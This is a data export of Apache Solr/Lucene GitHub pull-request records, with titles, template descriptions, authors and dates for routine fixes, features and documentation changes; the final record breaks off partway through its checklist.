"","2137","SOLR-14251 Add option skipFreeSpaceCheck to skip checking for availble disk space before splitting shards. Useful with shared file systems like HDFS","# Description  The Shard split operation is checking available disk space on local disks of the host Solr is running on even if the index is on a shared storage (e.g. HDFS).   # Solution  I'm adding option skipFreeSpaceCheck as a workaround so shards can be split until there is a proper solution implemented.  # Tests  Tested only manually.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ x I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gezapeti","2020-12-09T21:33:00Z","2020-12-15T14:59:47Z"
"","2015","SOLR-14067 move Stateless Script Update Processor to contrib","# Description  The scripting update processor is both powerful but also potentially dangerous, and shouldn't ship with Solr by default.  # Solution  Move the Stateless Script Update Processor out of `/core` and into `/contrib` so you need to install it.   I have not yet tried to make it a Solr Package.  Also, I am not happy with the word `Stateless` in the name of the update processor.   I'd love to see what others thought on just renaming `StatelessScriptUpdateProcessorFactory` to just `ScriptUpdateProcessorFactory`.   There is not `Stateful` equivalent, and it seems to me to obscure what this update processor is all about!  # Tests  I've run the existing tests and they pass.  # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2020-10-21T18:22:19Z","2020-10-21T18:59:52Z"
"","1865","SOLR-14862: Update RefGuide page for support fied types","# Description  The RefGuide page was missing some types and had too many Deprecated types in the same table as active types, which made it a bit hard to scan.  # Solution  - Went through the 8.6 javadoc and included missing field types in the Ref Guide page - Added small placeholder description in other page where the types had no mention at all  - Moved Deprecated types into their own table - Added some cross-references, for improved linking and understanding  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-09-13T19:29:32Z","2020-10-09T17:00:15Z"
"","2422","SOLR-15187: v2-POJO based SolrRequest classes","# Description  The POJOs used for serialization/deserialization by some V2 APIs have a lot of duplication with the existing SolrRequest objects for those APIs.  # Solution  Since they share the same fields, SolrRequest objects can be implemented using their v2-POJO counterparts.  # Tests  None, yet.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) as appropriate (for Solr changes only).","open","","gerlowskija","2021-02-23T15:44:52Z","2021-02-23T15:44:52Z"
"","1921","SOLR-14829: Improve documentation for Request Handlers in RefGuide and solrconfig.xml","# Description  The information in the Guide was not flowing and confusing, the sections on defaults were as if they were for Search Handlers only, not for all and there were not enough forward references to actually understand the available options.  Additionally, the shipped solrconfig.xml information was completely out of date and even misleading (by pretending to be the source of truth) and additional information links were going to the wiki, which were either out of date or completely dead.  # Solution  Completely refactor the relevant Ref Guide page (git does not even show diff by default).  Introduced a lot more cross-referencing and forward-referencing, including to URPs as parallel to Search Components.  Pointed solrconfig.xml links to RefGuide (latest-version redirects) and removed sections that were duplicating Ref Guide content (and falling out of sync).  # Tests  The changes were all documentation, but I double-checked that both configsets are still usable after changes made (no XML errors).  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-09-26T04:09:39Z","2020-10-07T00:35:48Z"
"","2183","SOLR-15070: Remove HashMap usage in SuggestComponent rsp","# Description  The HashMap added to the response by SuggestComponent is handled differently by each output format/wt/ResponseParser that Solr supports.  This discrepancy causes SolrJ produce different NamedList response structures when different wt's are used.  This leads to ClassCastException's elsewhere in SolrJ, particularly when QueryResponse attempts to parse responses which include ""suggest"" info.  # Solution  This PR replaces the HashMap in SuggestComponent with a NamedList - ensuring that the NamedList SolrJ produces on the client side is the same regardless of the wire format in use.  # Tests  Manual testing via SolrJ snippets, as well as a revamping of TestSuggesterResponse to use more than just BinaryResponseParser.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-01-06T17:45:44Z","2021-01-11T12:31:33Z"
"","2191","Add gradle settings for github actions.","# Description  The github precommit action is failing because of OOMs. It should be fixed by setting local settings before running gradle commands.","closed","","HoustonPutman","2021-01-08T19:32:01Z","2021-01-08T23:12:24Z"
"","1901","SOLR-14883 Add a Muse (Continuous assurance platform) configuration","# Description  The Apache infrastructure team has installed the Muse GitHub application.  In order for Lucene-Solr to benefit the application must understand how to build the project.  While it has build heuristics, it does not guess between JDK8 or JDK11 (two JDKs most supported by several static analysis tools).  Thus, this configuration explicitly instructs use of JDK11.  # Solution  Add a config.toml with `jdk11 = true`.  # Tests  I've run Muse with this configuration before.  If, for some reason, the configuration is incorrect of has a typo then it at least won't negatively impact the rest of the project.  # Checklist  - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have developed this patch against the `master` branch.","closed","","TomMD","2020-09-21T17:01:36Z","2020-09-24T00:42:19Z"
"","2336","SOLR-15101: Add list/delete APIs for incremental backups","# Description  SOLR-13608 introduced support into Solr for an ""incremental"" backup file structure, which allows storing multiple backup points for the same collection at a given location.  With the ability to store multiple backups at the same place, users will need to be able to list and cleanup these backups.  # Solution  This PR introduces two new APIs: one for listing the backups at a given location (along with associated metadata), and one to delete or cleanup these backups.  The APIs are offered in both v1 and v2 flavors.  # Tests  Manual testing, along with new automated tests in `PurgeGraphTest` (reference checking for detecting index files to delete), `V2CollectionBackupsAPIMappingTest` (v1<->v2 mapping), and `AbstractIncrementalBackupTest` (integration test for list, delete functionality).  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-02-09T14:16:04Z","2021-02-15T12:04:09Z"
"","2379","SOLR-15101: Add list/delete APIs for incremental backups","# Description  SOLR-13608 introduced a new ""incremental"" backup format, which allows storage of multiple backup ""points"" in the same location. But with this new capability comes the need to be able to list and individually delete these backups.  # Solution  This commit introduces /admin/collections?action=LISTBACKUPS and /admin/collections?action=DELETEBACKUP to handle these backups.  It's actually a backport of an existing PR for master.  # Tests  See the changes to AbstractIncrementalBackupTest and TestCollectionAdminRequest.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have run `ant precommit test`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-02-16T15:20:10Z","2021-02-17T00:55:28Z"
"","2281","SOLR-15118: Convert /v2/collections APIs to annotations","# Description  Solr supports two different ways to write v2 APIs: a JSON spec based approach, and one based on annotated POJOs.  The POJO method is now preferred.  This commit switches the /v2/collections APIs over to the annotation-based approach.  # Solution  This commit introduces a relatively rote migration of the JSON spec over to annotated POJOs.  There's little of note here, except for cases where the v2 JSON spec was missing support for params supported by the v1 APIs.  Here I had to make a few decisions as to whether property names should be retained, etc.  A good example of this is the v2 backup API, which had several params not covered by the existing v2 spec.  # Tests  Adds a new test: `V2CollectionsAPIMappingTest.java` to test the v2->v1 conversion.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-02-01T14:22:34Z","2021-02-08T15:11:58Z"
"","1707","SOLR-14692: Allow 'method' specification on JSON Facet join domain transforms","# Description  Solr offers several different join implementations which can be switched off providing the ""method"" local-param on JoinQuery's.  Each of these implementations has different performance characteristics and can behave very differently depending on a user's data and use case.  When joins are used internally as a part of JSON Faceting's ""join"" domain-transform though, users have no way to specify which implementation they would like to use.  We should correct this by adding a ""method"" property to the join domain-transform.  This will let user's choose the join that's most performant for their use case during JSON Facet requests.   # Solution  Adds parsing to FacetRequest for a 'method' value, which is then forwarded to JoinQParserPlugin.createJoinQuery to create the appropriate join-type.  # Tests  None, yet.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [ ] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2020-07-30T21:02:13Z","2020-08-11T12:21:21Z"
"","1771","SOLR-14752: Fix zk status with prometheus enabled zookeeper","# Description  Solr checks the zookeeper status in the admin UI and explicitly expects integers to be delivered. However if you enable the prometheus plugin in zookeeper, all values are posted as floats instead which breaks the existing check.  # Solution  This is a small fix to parse the values as floats and cast them into an integer. This should be fine since the number of followers can't actually be a float and the part behind the dot is always 0.  # Tests  None. This is my first Java contribution ever, so I'm happy for any clue how to do this.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","der-eismann","2020-08-21T09:23:15Z","2020-08-26T08:26:17Z"
"","2178","SOLR-15058: Enforce node_name contains colon and port and find first underscore after colon to parse context","# Description  See: https://issues.apache.org/jira/browse/SOLR-15058  # Solution  The current impl. of `Utils#getBaseUrlForNodeName` would create the wrong URL if the hostname contains an underscore `_`. However, the `ZkController#generateNodeName` function always creates node names with a `:` and port number, so this PR updates the `Utils#getBaseUrlForNodeName` to enforce the presence of a `:` colon and then finds the position of the the first `_` after the colon to find the context. The bulk of the changes here are updates to tests that were using node name values that don't adhere to the format created by `ZkController#generateNodeName`.  # Tests  Updated existing unit test to ensure hostnames with `_` are parsed correctly. Updated various unit tests that were using node name values that didn't adhere to the format used by `ZkController#generateNodeName`.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2021-01-05T18:39:58Z","2021-01-05T19:02:40Z"
"","2165","SOLR-15059: Improve query performance monitoring","# Description  See JIRA: https://issues.apache.org/jira/browse/SOLR-15059 ... see a detailed description in the JIRA  # Solution  Improve the Grafana dashboard to include graphs for monitoring query performance.  # Tests  Manual testing of the Grafana dashboard in the browser while running query load.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-23T17:22:28Z","2022-03-03T17:24:09Z"
"","2145","SOLR-15046: Check if SOLR_SSL_ENABLED strictly equal to true for setting solr.jetty.https.port","# Description  See JIRA: https://issues.apache.org/jira/browse/SOLR-15046  # Solution  Fix bin/solr IF statement.   # Tests  Manual test using: ``` cd solr ant server bin/solr start -c  bin/solr create -c test -s 1 -d _default WARNING: Using _default configset with data driven schema functionality. NOT RECOMMENDED for production use.          To turn off: bin/solr config -c test -p 8983 -action set-user-property -property update.autoCreateFields -value false Created collection 'test' with 1 shard(s), 1 replica(s) with config-set 'test' ```  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-14T17:40:22Z","2020-12-14T17:42:18Z"
"","2010","SOLR-12182: Don't persist base_url in ZK as the scheme is variable, compute from node_name instead","# Description  See JIRA for description of the issue: https://issues.apache.org/jira/browse/SOLR-12182  # Solution  This PR computes the `base_url` for a Replica using the stored `node_name` and a global `urlScheme` rather than storing the `base_url` in `state.json`. This avoids storing an incorrect URL scheme for replicas in persistent storage. The `base_url` is computed when read back from ZK and dropped when marshaling the Replica state to JSON. This also means we don't need a migration tool as stored state is ""healed"" on-the-fly when read back from ZK.  The unfortunate aspect of this PR is we need to keep the URL scheme for the cluster in a global variable (so that it is available when reading from ZK). The global `urlScheme` still comes from the cluster property but is then stored in a global singleton, see: `org.apache.solr.common.cloud.UrlScheme`. Alternatively, we could just keep the `urlScheme` in a static in ZkStateReader, I felt the global singleton `UrlScheme.INSTANCE` made it clearer that this was a global thing but it also made more sense with my first implementation that tried to make rolling restart upgrades to TLS less chaotic. It's a trivial change to move all this over to ZkStateReader and remove UrlScheme.  I initially tried setting a `ThreadLocal` that gives access to the `urlScheme` whenever we need to read these props from ZK. However, that ended up being problematic because we tend to read ZkNodeProps from ZK in many places. In reality, the `urlScheme` really is an immutable global variable that should be set once during initialization by reading from the cluster property stored in ZK. So I felt trying to treat this global as something that was highly dynamic made the code overly cumbersome. Put simply, we shouldn't support `urlScheme` changing in a live node after initialization, it's bad for business.  I also tried to get rid of the `urlScheme` cluster property (re: https://issues.apache.org/jira/browse/SOLR-10202) but I'm not sure how SolrCloud client applications can resolve the correct `urlScheme` for the cluster without this property? On the server-side, sure we can just get the `urlScheme` from a Java System Property, but that won't be set for remote client applications that initialize via a connection to ZooKeeper. So I'm keeping the cluster property `urlScheme` for now.  We also need to consider how to enable TLS on an existing cluster (with active collections) using a rolling restart process. The current `org.apache.solr.cloud.SSLMigrationTest` just stopped all test nodes at once and then brought them back with TLS enabled.  Based on feedback, I've since removed the option to pull the active urlScheme from live nodes as we're not able to ensure zero-downtime when moving from `http` -> `https` for clusters with existing collections and live traffic. Put simply, the feature was a bit trappy in that it tried to reduce chaos when doing a rolling restart to enable TLS, but it made no guarantees. Thus, users just need to be sure to enable TLS before building production clusters!  Lastly, I've tried to clean-up some of the places that access the baseUrl on replicas to be more consistent, so you'll see some of that in this PR as well.  # Tests  Many existing tests cover regression caused by these code changes. Added simple unit test for UrlScheme.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-10-20T20:29:00Z","2021-12-17T23:50:15Z"
"","2132","SOLR-15036: auto- select / rollup / sort / plist over facet expression when using a collection alias with multiple collections","# Description  See full description and background info in https://issues.apache.org/jira/browse/SOLR-15036  # Solution  This PR adds support for automatically wrapping a `facet` stream with a `sort(select(hashRollup(plist(facet(col1, ...), facet(col2, ...)))))` expression to allow parallelizing metrics computation across multiple collections concurrently. This auto-wrapping only applies if the collection parameter to the `facet` stream points to an **alias with multiple collections**.   You might ask why should we bother but I'd counter that this is a simple improvement that helps make aliases work better for analytics applications. In other words, what's the point of providing aliases that abstract querying many collections if client applications have to be aware of the backing collections and create a plist to get better performance? In general, Solr should aim to hide details of the underlying collections for an alias as much as possible.  The intended use for this feature is in large clusters where you have many collections with many shards behind the alias. The bulk of the auto-plist logic is implemented in the `ParallelMetricsRollup` interface; currently only `FacetStream` implements `ParallelMetricsRollup` but other stream sources could make use of this in the future.  The parallelization approach works nicely for `count`, `sum`, `min`, `max`, and `avg` metrics. All other metrics cannot be safely rolled up and thus cannot be parallelized with a `plist`; rolling up over multiple `avg` metrics requires a new weighted sum metric, also introduced in this PR.  The auto-plist approach applies automatically but can be disabled by passing a `tiered=false` parameter to the facet expression or globally by setting the `solr.facet.stream.tiered=false` system property. The reason behind the `tiered` parameter name is:  > the `plist` sets up a middle tier of aggregator nodes, one per aliased collection. This happens because of how the facet expression works, which is to setup a `CloudSolrClient` and push the facet call to the collection (from Joel B.)  # Tests  Introduced a new unit test to verify the auto-plist rollup works properly with a single dimension as well as multiple dimensions, where the latter ensures the sorting logic of the final stream is correct. More importantly, I tested this approach in a large cluster with 10's of collections (~50), each with many shards (~100) and the performance was quite impressive, around 5-6x faster than just executing a `facet` expression without `plist`. This is also more scalable as it doesn't put a large spike in concurrent shard requests on a single node (top-level controller / coordinator), so can support more concurrent facet stream requests as the load is distributed better between client and cluster.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-09T00:50:02Z","2021-01-11T17:34:28Z"
"","2429","LUCENE-9791 Allow calling BytesRefHash#find concurrently","# Description  Replaces `scratch1` field in `BytesRefHash` with `scratch` local variable. As a result it is now possible to call `BytesRefHash#find` concurrently as long as there are no concurrent modifications to BytesRefHash instance and it is correctly published.  This addresses the concurrency issue with Monitor (aka Luwak) since it is using `BytesRefHash#find` concurrently without additional synchronization.  While in theory creating a new `BytesRef` in `equals` method means additional allocation, in practice this allocation is removed by C2 compiler when inlining find method.  # Solution  Remove unnecessary state from `BytesRefHash` so that non-mutating find method behaves similar to `HashMap`'s get/containsKey.  # Tests  Added a new unit test that reproduces a problem. Checked that C2 compiler correctly removes the new allocation.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).  # Issue link https://issues.apache.org/jira/browse/LUCENE-9791","closed","","pawel-bugalski-dynatrace","2021-02-24T15:30:50Z","2021-03-10T17:12:34Z"
"","2435","SOLR-15203: remove deprecated jwk url","# Description  Removing deprecated parameter.  # Solution  Just some clean up, documented in the upgrade notes.  # Tests  n/a  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [X ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-27T14:44:04Z","2021-03-18T23:54:20Z"
"","2306","SOLR-15121: Move XSLT (tr param) to scripting contrib","# Description  Reduce security exposure for solr by moving the xslt to scripting.  # Solution  Migrating code.  # Tests  running existing tests.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-04T22:53:06Z","2021-02-16T14:20:24Z"
"","1741","SOLR-14677: Always close DIH EntityProcessor/DataSource","# Description  Prior to this commit, the wrapup logic at the end of DocBuilder.execute() closed out a series of DIH objects, but did so in a way that an exception closing any of them resulted in the remainder staying open.  This is especially problematic since Writer.close() throws exceptions that DIH uses to determine the success/failure of the run.  In practice this caused network errors sending DIH data to other Solr nodes to result in leaked JDBC connections.  # Solution  This PR changes DocBuilder's termination logic to handle exceptions more gracefully, ensuring that errors closing a DIHWriter (for example) don't prevent the closure of entity-processor and DataSource objects.  # Tests  None  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2020-08-12T00:20:51Z","2020-08-14T01:21:37Z"
"","2437","SOLR-15204: Document bin solr zk and zkcli","# Description  Prefer the bin/solr zk command where possible over zkcli.sh.  # Solution  Updating docs.  Maybe will also extend in seperate tickets adding more commands to bin/solr zk if needed???  # Tests  doc change only, manual testing!  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-27T16:03:16Z","2021-03-03T19:43:01Z"
"","2325","LUCENE-9747: Missing package-info.java causes NPE in MissingDoclet.java","# Description  Missing `package-info.java` causes a NPE in the javadocs task and is not obvious what went wrong!  # Solution  Look for the very specific situation, and then don't include the `Element` in the `reporter.print()` method.  Maybe this should be a more generic test, but I wanted to be careful of not breaking other things.  # Tests  Delete a `package-info.java`, and then run javadocs and you'll see the error!  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X ] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-08T20:54:03Z","2021-02-08T22:34:34Z"
"","2456","SOLR-15216 Fix for Invalid Reference to data.followers in Admin UI","# Description  Minor bug in the Admin UI Angular code introduced when switching to followers terminology, the underlying API for 8.x still refers to them as slave. In master 9.x branch this is resolved as full migration to new terminology is complete, but any future 8.x builds would have this issue.  This bug prevents the Replication UI for Legacy Replication from loading if polling is enabled and there has been a successful run.  # Solution  Changed to use the correct JavaScript attribute.  # Tests  Compiled and ran the UI against my development instance, verified that the UI loads correctly.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run 